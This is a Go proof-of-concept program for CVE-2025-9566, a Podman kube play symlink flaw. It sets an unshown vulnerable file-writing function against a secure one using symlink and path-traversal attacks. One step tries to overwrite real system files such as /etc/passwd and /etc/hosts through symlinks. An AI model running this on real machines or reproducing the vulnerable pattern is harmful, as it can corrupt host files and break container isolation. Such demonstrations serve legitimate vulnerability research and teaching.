package main

import (
	"fmt"
	"os"
	"path/filepath"
)

// ANSI color codes
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
	ColorBold   = "\033[1m"
)

func printSuccess(message string) {
	fmt.Printf("%s✓ %s%s\n", ColorGreen, message, ColorReset)
}

func printFailure(message string) {
	fmt.Printf("%s✗ %s%s\n", ColorRed, message, ColorReset)
}

func printWarning(message string) {
	fmt.Printf("%s⚠️  %s%s\n", ColorYellow, message, ColorReset)
}

func printCritical(message string) {
	fmt.Printf("%s🚨 %s%s\n", ColorRed+ColorBold, message, ColorReset)
}

func printInfo(message string) {
	fmt.Printf("%sℹ️  %s%s\n", ColorBlue, message, ColorReset)
}

func printStep(step string) {
	fmt.Printf("\n%s=== %s ===%s\n", ColorCyan+ColorBold, step, ColorReset)
}

func printSubStep(step string) {
	fmt.Printf("\n%s--- %s ---%s\n", ColorPurple, step, ColorReset)
}

func main() {
	fmt.Printf("%sCVE-2025-9566: Podman kube play symlink vulnerability PoC%s\n", ColorBold+ColorRed, ColorReset)
	fmt.Printf("%s========================================================%s\n", ColorBold, ColorReset)

	// Create mount points
	vulnerableMount := "/tmp/vulnerable-mount"
	secureMount := "/tmp/secure-mount"

	if err := os.MkdirAll(vulnerableMount, 0755); err != nil {
		fmt.Printf("Error creating vulnerable mount: %v\n", err)
		return
	}
	defer os.RemoveAll(vulnerableMount)

	if err := os.MkdirAll(secureMount, 0755); err != nil {
		fmt.Printf("Error creating secure mount: %v\n", err)
		return
	}
	defer os.RemoveAll(secureMount)

	// Test data
	normalData := []byte("This is normal config data")
	maliciousData := []byte("HACKED: This data escaped the mount point!")

	printStep("STEP 1: Normal Operation")

	// Test normal operation with vulnerable code
	fmt.Printf("Testing vulnerable code with normal file:\n")
	if err := vulnerableCreateFile(vulnerableMount, "config.txt", normalData); err != nil {
		printFailure(fmt.Sprintf("Error: %v", err))
	} else {
		printSuccess("Normal file created successfully")
	}

	// Test normal operation with secure code
	fmt.Printf("\nTesting secure code with normal file:\n")
	if err := secureCreateFile(secureMount, "config.txt", normalData); err != nil {
		printFailure(fmt.Sprintf("Error: %v", err))
	} else {
		printSuccess("Normal file created successfully")
	}

	printStep("STEP 2: Symlink Attack")

	// Create malicious symlinks
	vulnerableSymlink := filepath.Join(vulnerableMount, "malicious.txt")
	secureSymlink := filepath.Join(secureMount, "malicious.txt")
	targetFile := "/tmp/escaped-file.txt"

	printInfo("Creating malicious symlinks:")
	fmt.Printf("  %s -> %s\n", vulnerableSymlink, targetFile)
	fmt.Printf("  %s -> %s\n", secureSymlink, targetFile)

	if err := os.Symlink(targetFile, vulnerableSymlink); err != nil {
		printFailure(fmt.Sprintf("Error creating vulnerable symlink: %v", err))
	}

	if err := os.Symlink(targetFile, secureSymlink); err != nil {
		printFailure(fmt.Sprintf("Error creating secure symlink: %v", err))
	}

	// Test vulnerable code with symlink
	fmt.Printf("\nTesting vulnerable code with symlink:\n")
	if err := vulnerableCreateFile(vulnerableMount, "malicious.txt", maliciousData); err != nil {
		printFailure(fmt.Sprintf("Error: %v", err))
	} else {
		printSuccess("Vulnerable code followed symlink!")

		// Check if file was created at target location
		if _, err := os.Stat(targetFile); err == nil {
			printCritical(fmt.Sprintf("ATTACK SUCCESSFUL: File created at %s", targetFile))
			if content, err := os.ReadFile(targetFile); err == nil {
				fmt.Printf("Content: %s\n", string(content))
			}
		}
	}

	// Test secure code with symlink
	fmt.Printf("\nTesting secure code with symlink:\n")
	if err := secureCreateFile(secureMount, "malicious.txt", maliciousData); err != nil {
		printSuccess(fmt.Sprintf("SECURITY: Attack blocked - %v", err))
	} else {
		printFailure("SECURITY: Attack succeeded (this shouldn't happen)")
	}

	fmt.Printf("\n=== STEP 3: Path Traversal Attack ===\n")

	// Test path traversal with vulnerable code
	fmt.Printf("Testing vulnerable code with path traversal:\n")
	if err := vulnerableCreateFile(vulnerableMount, "../../../tmp/traversal.txt", maliciousData); err != nil {
		fmt.Printf("Error: %v\n", err)
	} else {
		fmt.Printf("✓ Vulnerable code allowed path traversal!\n")

		// Check if file was created at traversal location
		if _, err := os.Stat("/tmp/traversal.txt"); err == nil {
			fmt.Printf("🚨 ATTACK SUCCESSFUL: File created at /tmp/traversal.txt\n")
			os.Remove("/tmp/traversal.txt")
		}
	}

	// Test path traversal with secure code
	fmt.Printf("\nTesting secure code with path traversal:\n")
	if err := secureCreateFile(secureMount, "../../../tmp/traversal-secure.txt", maliciousData); err != nil {
		fmt.Printf("✓ SECURITY: Path traversal blocked - %v\n", err)
	} else {
		fmt.Printf("✗ SECURITY: Path traversal succeeded (this shouldn't happen)\n")
	}

	fmt.Printf("\n=== STEP 4: Real System File Attack ===\n")

	// Target real system files that exist in containers
	systemFiles := []string{
		"/etc/hostname",
		"/etc/hosts",
		"/etc/resolv.conf",
		"/etc/passwd",
		"/etc/group",
	}

	for _, systemFile := range systemFiles {
		fmt.Printf("\n--- Targeting: %s ---\n", systemFile)

		// Check if file exists and is readable
		if content, err := os.ReadFile(systemFile); err != nil {
			fmt.Printf("File not accessible: %v\n", err)
			continue
		} else {
			fmt.Printf("Original content (first 200 chars):\n%.200s...\n", string(content))
		}

		// Create symlink to system file
		fileName := filepath.Base(systemFile)
		systemSymlink := filepath.Join(vulnerableMount, fileName)

		if err := os.Symlink(systemFile, systemSymlink); err != nil {
			fmt.Printf("Error creating symlink: %v\n", err)
			continue
		} else {
			fmt.Printf("Created symlink: %s -> %s\n", systemSymlink, systemFile)
		}

		// Test vulnerable code - try to modify system file
		maliciousData := []byte(fmt.Sprintf("HACKED: %s was compromised by CVE-2025-9566\nOriginal timestamp: %s\n", systemFile, "2024-01-01 12:00:00"))

		fmt.Printf("Testing vulnerable code with system file attack:\n")
		if err := vulnerableCreateFile(vulnerableMount, fileName, maliciousData); err != nil {
			fmt.Printf("Error: %v\n", err)
		} else {
			printSuccess("Vulnerable code attempted to modify system file!")

			// Check if the file was actually modified
			if newContent, err := os.ReadFile(systemFile); err == nil {
				if string(newContent) == string(maliciousData) {
					printCritical("System file successfully modified!")
					fmt.Printf("New content:\n%s\n", string(newContent))
				} else {
					printWarning("File exists but content unchanged - PERMISSION DENIED")
					fmt.Printf("Current content (first 200 chars):\n%.200s...\n", string(newContent))
					fmt.Printf("Expected content (first 200 chars):\n%.200s...\n", string(maliciousData))
				}
			} else {
				printFailure(fmt.Sprintf("Could not read file after attack: %v", err))
			}
		}

		// Test secure code - should block system file modification
		fmt.Printf("Testing secure code with system file attack:\n")
		if err := secureCreateFile(secureMount, fileName, maliciousData); err != nil {
			printSuccess(fmt.Sprintf("SECURITY: System file attack blocked - %v", err))
		} else {
			printFailure("SECURITY: System file attack succeeded (this shouldn't happen)")
		}
	}

	printStep("STEP 5: Writable File Attack (Real Impact)")

	// Test with actually writable files to show real impact
	writableFiles := []string{
		"/tmp/user-data.txt",
		"/tmp/config.json",
		"/tmp/logs.txt",
	}

	for _, writableFile := range writableFiles {
		fileName := filepath.Base(writableFile)
		printSubStep(fmt.Sprintf("Targeting: %s", writableFile))

		// Create original content
		originalContent := fmt.Sprintf("Original content of %s\nSensitive data: password123\nAPI key: secret456\n", fileName)
		if err := os.WriteFile(writableFile, []byte(originalContent), 0644); err != nil {
			fmt.Printf("Error creating writable file: %v\n", err)
			continue
		}

		fmt.Printf("Original content:\n%s\n", originalContent)

		// Create symlink
		writableSymlink := filepath.Join(vulnerableMount, fileName)
		if err := os.Symlink(writableFile, writableSymlink); err != nil {
			fmt.Printf("Error creating symlink: %v\n", err)
			continue
		}

		// Test vulnerable code
		maliciousData := []byte(fmt.Sprintf("HACKED: %s was compromised!\nNew password: hacked789\nNew API key: evil999\n", fileName))

		fmt.Printf("Testing vulnerable code with writable file attack:\n")
		if err := vulnerableCreateFile(vulnerableMount, fileName, maliciousData); err != nil {
			printFailure(fmt.Sprintf("Error: %v", err))
		} else {
			printSuccess("Vulnerable code attempted to modify writable file!")

			// Check if the file was actually modified
			if newContent, err := os.ReadFile(writableFile); err == nil {
				if string(newContent) == string(maliciousData) {
					printCritical("Writable file successfully modified!")
					fmt.Printf("New content:\n%s\n", string(newContent))
				} else {
					printWarning("File exists but content unchanged")
					fmt.Printf("Current content:\n%s\n", string(newContent))
					fmt.Printf("Expected content:\n%s\n", string(maliciousData))
				}
			}
		}

		// Clean up
		os.Remove(writableFile)
		os.Remove(writableSymlink)
	}

	printStep("STEP 6: File Overwrite Attack")

	// Create a target file to overwrite
	targetOverwriteFile := "/tmp/important-config.txt"
	originalContent := "This is an important system configuration file\nDatabase password: secret123\nAPI key: abc123xyz\n"

	// Write original content
	if err := os.WriteFile(targetOverwriteFile, []byte(originalContent), 0644); err != nil {
		fmt.Printf("Error creating target file: %v\n", err)
	} else {
		fmt.Printf("Created target file: %s\n", targetOverwriteFile)
		fmt.Printf("Original content:\n%s\n", originalContent)
	}

	// Create symlink pointing to the target file
	overwriteSymlink := filepath.Join(vulnerableMount, "overwrite.txt")
	if err := os.Symlink(targetOverwriteFile, overwriteSymlink); err != nil {
		fmt.Printf("Error creating overwrite symlink: %v\n", err)
	} else {
		fmt.Printf("Created symlink: %s -> %s\n", overwriteSymlink, targetOverwriteFile)
	}

	// Test vulnerable code - overwrite the target file
	maliciousOverwriteData := []byte("HACKED: System compromised!\nNew password: hacked123\nNew API key: evil456\n")
	fmt.Printf("\nTesting vulnerable code with file overwrite:\n")
	if err := vulnerableCreateFile(vulnerableMount, "overwrite.txt", maliciousOverwriteData); err != nil {
		printFailure(fmt.Sprintf("Error: %v", err))
	} else {
		printSuccess("Vulnerable code overwrote the target file!")

		// Check the overwritten content
		if content, err := os.ReadFile(targetOverwriteFile); err == nil {
			printCritical("ATTACK SUCCESSFUL: File content overwritten!")
			fmt.Printf("New content:\n%s\n", string(content))
		}
	}

	// Test secure code - should block the overwrite
	fmt.Printf("\nTesting secure code with file overwrite:\n")
	if err := secureCreateFile(secureMount, "overwrite.txt", maliciousOverwriteData); err != nil {
		printSuccess(fmt.Sprintf("SECURITY: Overwrite attack blocked - %v", err))
	} else {
		printFailure("SECURITY: Overwrite attack succeeded (this shouldn't happen)")
	}

	printStep("SUMMARY")
	fmt.Printf("Vulnerable code: Allows symlink following and path traversal\n")
	fmt.Printf("Secure code: Blocks symlink following and path traversal\n")
	fmt.Printf("This demonstrates CVE-2025-9566 in Podman kube play\n")
	fmt.Printf("\n")
	printCritical("CRITICAL IMPACTS DEMONSTRATED:")
	fmt.Printf("1. System file modification - targeting /etc/passwd, /etc/hosts, etc.\n")
	fmt.Printf("2. File overwrite attacks - modifying important configuration files\n")
	fmt.Printf("3. Container isolation bypass - accessing host files\n")
	fmt.Printf("4. Path traversal - escaping mount point boundaries\n")

	// Cleanup
	os.Remove(targetFile)
	os.Remove(targetOverwriteFile)
}
